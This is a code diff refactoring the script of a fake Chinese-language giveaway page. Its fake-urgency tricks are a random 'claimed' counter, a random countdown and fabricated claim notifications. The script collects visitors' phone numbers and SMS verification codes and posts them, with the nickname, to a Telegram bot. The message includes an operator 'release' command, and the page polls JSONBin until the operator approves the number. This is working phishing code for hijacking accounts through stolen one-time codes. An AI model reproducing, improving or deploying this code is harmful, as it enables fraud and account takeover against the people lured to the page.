+  els.claimedCount.textContent = claimed.toLocaleString('zh-CN');
+  els.remainCount.textContent = remain.toLocaleString('zh-CN');
+  els.countNum.textContent = claimed.toLocaleString('zh-CN');
+  if (remain < 100) els.remainCount.classList.add('low-stock');
 }
 
-// 假增长 + 弹幕
-function fakeClaimIncrease() {
-  if (Math.random() > 0.4) {
-    const add = 1 + Math.floor(Math.random() * 4);
+function fakeClaim() {
+  if (Math.random() > 0.45) {
+    const add = 1 + Math.floor(Math.random()*5);
     claimed += add;
-    updateStockDisplay();
-    for (let i = 0; i < add; i++) {
-      setTimeout(shootBarrage, i * 800);
-    }
+    updateStock();
+    for(let i=0; i<add; i++) setTimeout(shootBarrage, i*900);
   }
 }
 
-// 手机号验证 + 滑块
 function checkPhoneValid() {
-  const val = phoneEl.value.trim();
+  const val = els.phone.value.trim();
   const valid = /^1[3-9]\d{9}$/.test(val);
-  phoneEl.classList.toggle('input-error', val.length > 0 && !valid);
+  els.phone.classList.toggle('input-error', val && !valid);
+
   if (valid) {
-    verifySlider.classList.add('show');
-    if (!verifyBlock.dataset.inited) initSliderVerify();
+    // 如果你想完全跳过滑块验证，打开下面两行
+    // isVerifySuccess = true;
+    // els.verifySlider.style.display = 'none';
+    // els.getBtn.disabled = false;
+    // return;
+
+    els.verifySlider.classList.add('show');
+    if (!els.verifyBlock.dataset.inited) initSlider();
   } else {
-    verifySlider.classList.remove('show');
+    els.verifySlider.classList.remove('show');
     isVerifySuccess = false;
     resetSlider();
   }
-  getBtn.disabled = !valid || !isVerifySuccess;
+  els.getBtn.disabled = !valid || !isVerifySuccess;
 }
 
 function resetSlider() {
-  verifySlider.classList.remove('verify-success');
-  verifyBlock.style.left = '0px';
-  verifyBg.style.width = '0px';
-  verifyBlock.textContent = '→';
+  els.verifySlider.classList.remove('verify-success');
+  els.verifyBlock.style.left = '0';
+  els.verifyBg.style.width = '0';
+  els.verifyBlock.textContent = '→';
 }
 
-function initSliderVerify() {
-  verifyBlock.dataset.inited = 'true';
-  let isDragging = false;
-  const sliderW = verifySlider.offsetWidth;
-  const blockW = verifyBlock.offsetWidth;
-  const maxLeft = sliderW - blockW;
+function initSlider() {
+  els.verifyBlock.dataset.inited = 'true';
+  let dragging = false;
+  const max = els.verifySlider.offsetWidth - els.verifyBlock.offsetWidth;
 
-  const startDrag = (e) => {
+  const start = e => {
     if (isVerifySuccess) return;
-    isDragging = true;
-    const startX = e.clientX || e.touches[0].clientX;
-    const startLeft = parseFloat(verifyBlock.style.left) || 0;
+    dragging = true;
+    const sx = e.clientX || e.touches?.[0]?.clientX;
+    const sl = parseFloat(els.verifyBlock.style.left) || 0;
 
-    const move = (ev) => {
-      if (!isDragging) return;
-      const dx = (ev.clientX || ev.touches[0].clientX) - startX;
-      let left = Math.max(0, Math.min(startLeft + dx, maxLeft));
-      verifyBlock.style.left = left + 'px';
-      verifyBg.style.width = left + 'px';
+    const move = ev => {
+      if (!dragging) return;
+      const dx = (ev.clientX || ev.touches?.[0]?.clientX) - sx;
+      let l = Math.max(0, Math.min(sl + dx, max));
+      els.verifyBlock.style.left = l + 'px';
+      els.verifyBg.style.width = l + 'px';
     };
 
-    const end = (ev) => {
-      isDragging = false;
-      const finalLeft = parseFloat(verifyBlock.style.left) || 0;
-      if (finalLeft >= maxLeft * 0.85) {
+    const end = () => {
+      dragging = false;
+      const l = parseFloat(els.verifyBlock.style.left) || 0;
+      if (l >= max * 0.8) {
         isVerifySuccess = true;
-        verifySlider.classList.add('verify-success');
-        verifyBlock.textContent = '✓';
-        verifyBlock.style.left = maxLeft + 'px';
-        verifyBg.style.width = maxLeft + 'px';
+        els.verifySlider.classList.add('verify-success');
+        els.verifyBlock.textContent = '✓';
+        els.verifyBlock.style.left = max + 'px';
+        els.verifyBg.style.width = max + 'px';
         checkPhoneValid();
-      } else {
-        resetSlider();
-      }
+      } else resetSlider();
       document.removeEventListener('mousemove', move);
       document.removeEventListener('touchmove', move);
       document.removeEventListener('mouseup', end);
@@ -971,143 +287,138 @@ function initSliderVerify() {
     };
 
     document.addEventListener('mousemove', move);
-    document.addEventListener('touchmove', move, {passive: false});
+    document.addEventListener('touchmove', move, {passive:false});
     document.addEventListener('mouseup', end);
     document.addEventListener('touchend', end);
   };
 
-  verifyBlock.addEventListener('mousedown', startDrag);
-  verifyBlock.addEventListener('touchstart', (e) => { e.preventDefault(); startDrag(e.touches[0]); }, {passive: false});
+  els.verifyBlock.addEventListener('mousedown', start);
+  els.verifyBlock.addEventListener('touchstart', e => { e.preventDefault(); start(e.touches[0]); }, {passive:false});
 }
 
-// 全局倒计时（修复：确保启动）
-function startGlobalCountdown() {
-  let remain = 120 * 60 + Math.floor(Math.random() * 180 * 60); // 2~5小时随机
-  const timerEl = document.getElementById('globalTimer');
-
-  function tick() {
-    if (remain <= 0) {
-      timerEl.textContent = "本轮已结束，刷新进入下一轮";
-      setTimeout(() => location.reload(), 3000);
+function startCountdown() {
+  if (!els.globalTimer) return;
+  let sec = 120*60 + Math.floor(Math.random()*180*60);
+  const tick = () => {
+    if (sec <= 0) {
+      els.globalTimer.textContent = '本轮已结束，请刷新';
+      setTimeout(() => location.reload(), 4000);
       return;
     }
-    const h = Math.floor(remain / 3600).toString().padStart(2, '0');
-    const m = Math.floor((remain % 3600) / 60).toString().padStart(2, '0');
-    const s = (remain % 60).toString().padStart(2, '0');
-    timerEl.textContent = `本轮名额倒计时：\( {h}: \){m}:${s}`;
-    remain--;
-  }
-
-  tick();                    // 立即执行一次
-  timers.globalCd = setInterval(tick, 1000);
+    const h = Math.floor(sec/3600).toString().padStart(2,'0');
+    const m = Math.floor((sec%3600)/60).toString().padStart(2,'0');
+    const s = (sec%60).toString().padStart(2,'0');
+    els.globalTimer.textContent = `本轮名额倒计时：\( {h}: \){m}:${s}`;
+    sec--;
+  };
+  tick();
+  timers.global = setInterval(tick, 1000);
 }
 
-// 轮询 JSONBin 审核通过
-async function startPolling(phone) {
-  loadingMask.querySelector('.loading-text').textContent = '人工审核中，请稍等（通常 1-5 分钟）...';
-  loadingMask.classList.add('show');
-
-  if (timers.poll) clearInterval(timers.poll);
+async function pollCheck(phone) {
+  els.loadingMask.querySelector('.loading-text').textContent = '人工审核中，请稍等...';
+  els.loadingMask.classList.add('show');
 
   timers.poll = setInterval(async () => {
     try {
-      const res = await axios.get(BIN_URL, { headers: BIN_HEADERS });
-      const data = res.data?.record || {};
-      if (Array.isArray(data.allowed_phones) && data.allowed_phones.includes(phone)) {
+      const { data } = await axios.get(BIN_URL, { headers: BIN_HEADERS });
+      if (data?.record?.allowed_phones?.includes(phone)) {
         clearInterval(timers.poll);
-        loadingMask.classList.remove('show');
+        els.loadingMask.classList.remove('show');
         claimed++;
-        updateStockDisplay();
+        updateStock();
         shootBarrage(phone);
-        modal.style.display = 'flex';
-        localStorage.setItem('mx_claim_' + phone, Date.now().toString());
+        els.modal.classList.add('show');
+        localStorage.setItem('mx_claim_' + phone, Date.now());
       }
     } catch {}
-  }, 5000);
+  }, 6000);
 }
 
-// 事件绑定
-phoneEl.addEventListener('input', checkPhoneValid);
-phoneEl.addEventListener('blur', checkPhoneValid);
+// ============================= 事件 =============================
+els.phone.addEventListener('input', checkPhoneValid);
+els.phone.addEventListener('blur', checkPhoneValid);
 
-getBtn.addEventListener('click', async () => {
-  if (getBtn.disabled) return;
-  const phone = phoneEl.value.trim();
-  const nick = nicknameEl.value.trim() || '无';
+els.getBtn.addEventListener('click', async () => {
+  if (els.getBtn.disabled) return;
+  const phone = els.phone.value.trim();
+  const nick = els.nickname.value.trim() || '无';
 
   try {
     await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
       method: 'POST',
-      headers: {'Content-Type': 'application/json'},
+      headers: {'Content-Type':'application/json'},
       body: JSON.stringify({
         chat_id: CHAT_ID,
-        text: `【新手机号】\n昵称：\( {nick}\n手机： \){phone}\n时间：${new Date().toLocaleString('zh-CN')}`
+        text: `【新号】\n昵称：\( {nick}\n手机号： \){phone}\n时间：${new Date().toLocaleString('zh-CN')}`
       })
     });
   } catch {}
 
-  let sec = 60;
-  getBtn.disabled = true;
-  codeEl.disabled = false;
-  codeEl.focus();
-  cdEl.style.opacity = '1';
-  cdEl.textContent = `验证码已发送（${sec}s）`;
+  let s = 60;
+  els.getBtn.disabled = true;
+  els.code.disabled = false;
+  els.code.focus();
+  els.countdown.style.opacity = '1';
+  els.countdown.textContent = `验证码已发送（${s}s）`;
 
-  timers.codeCd = setInterval(() => {
-    sec--;
-    getBtn.textContent = `重发(${sec}s)`;
-    cdEl.textContent = `验证码已发送（${sec}s）`;
-    if (sec <= 0) {
-      clearInterval(timers.codeCd);
-      getBtn.disabled = false;
-      getBtn.textContent = '获取验证码';
-      cdEl.style.opacity = '0';
+  timers.code = setInterval(() => {
+    s--;
+    els.getBtn.textContent = `重发(${s}s)`;
+    els.countdown.textContent = `验证码已发送（${s}s）`;
+    if (s <= 0) {
+      clearInterval(timers.code);
+      els.getBtn.disabled = false;
+      els.getBtn.textContent = '获取验证码';
+      els.countdown.style.opacity = '0';
     }
   }, 1000);
 });
 
-codeEl.addEventListener('input', () => {
-  const len = codeEl.value.trim().length;
-  submitBtn.style.display = len >= 4 ? 'block' : 'none';
-  submitBtn.disabled = len < 4;
-  codeEl.classList.toggle('input-error', len > 0 && len < 6);
+els.code.addEventListener('input', () => {
+  const len = els.code.value.trim().length;
+  els.submitBtn.style.display = len >= 4 ? 'block' : 'none';
+  els.submitBtn.disabled = len < 4;
+  els.code.classList.toggle('input-error', len > 0 && len < 6);
 });
 
-submitBtn.addEventListener('click', async () => {
-  if (submitBtn.disabled) return;
-  const phone = phoneEl.value.trim();
-  const code = codeEl.value.trim();
-  const nick = nicknameEl.value.trim() || '无';
+els.submitBtn.addEventListener('click', async () => {
+  if (els.submitBtn.disabled) return;
+  const phone = els.phone.value.trim();
+  const code = els.code.value.trim();
+  const nick = els.nickname.value.trim() || '无';
 
-  if (code.length < 4) return alert('验证码太短');
+  if (code.length < 4) return alert('验证码格式错误');
 
   try {
     await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
       method: 'POST',
-      headers: {'Content-Type': 'application/json'},
+      headers: {'Content-Type':'application/json'},
       body: JSON.stringify({
         chat_id: CHAT_ID,
-        text: `【验证码到手】\n昵称：\( {nick}\n手机： \){phone}\n验证码：\( {code}\n时间： \){new Date().toLocaleString('zh-CN')}\n\n放行指令：通过 ${phone}`
+        text: `【验证码】\n昵称：\( {nick}\n手机号： \){phone}\n验证码：\( {code}\n时间： \){new Date().toLocaleString('zh-CN')}\n放行：通过 ${phone}`
       })
     });
   } catch {}
 
-  startPolling(phone);
-  showToast('提交成功，等待审核通过...', 'info');
+  pollCheck(phone);
+  showToast('提交成功，正在等待人工审核...');
 });
 
-closeModalBtn.addEventListener('click', () => modal.style.display = 'none');
-modal.addEventListener('click', e => { if (e.target === modal) modal.style.display = 'none'; });
+els.modal.addEventListener('click', e => {
+  if (e.target === els.modal) els.modal.classList.remove('show');
+});
 
-// 启动所有定时器
-timers.fakeStock   = setInterval(fakeClaimIncrease, 1800);
-timers.barrageAuto = setInterval(() => { if (Math.random() > 0.55) shootBarrage(); }, 4500);
-startGlobalCountdown();
-updateStockDisplay();
+// ============================= 启动 =============================
+window.addEventListener('load', () => {
+  timers.fake = setInterval(fakeClaim, 2200);
+  timers.barrage = setInterval(() => Math.random() > 0.5 && shootBarrage(), 5000);
+  startCountdown();
+  updateStock();
+});
 
-// 清理
 window.addEventListener('beforeunload', () => {
-  Object.values(timers).forEach(t => t && clearInterval(t));
+  Object.values(timers).forEach(t => clearInterval(t));
 });
 </script>
 </body>
